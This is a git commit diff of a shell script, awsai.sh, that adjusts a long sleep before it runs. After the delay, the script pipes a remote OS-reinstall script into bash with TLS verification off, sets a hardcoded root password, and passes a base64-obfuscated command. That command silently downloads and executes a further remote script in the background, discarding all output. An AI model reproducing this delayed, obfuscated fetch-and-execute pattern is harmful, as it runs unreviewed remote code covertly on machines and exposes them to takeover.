2efedf0cd62c5bd25c353ea7d13a0ca4f77123e9
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-07-21 06:42:07 +0800

    Update awsai.sh

--- awsai.sh
+++ awsai.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
 
-#20240721#sleep 86400
-sleep "$[`od -An -N2 -i /dev/urandom` % 75600 + 21600]"
+#20240721
+sleep 90000
+#sleep "$[`od -An -N2 -i /dev/urandom` % 75600 + 21600]"
 
 
 bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jdXJpb3NpdHlpbnRlcmlvcnN1ay8yMDg4L21haW4vemg4OGtrMi5zaCkgPj4vZGV2L251bGwgMj4mMSAmCg=="
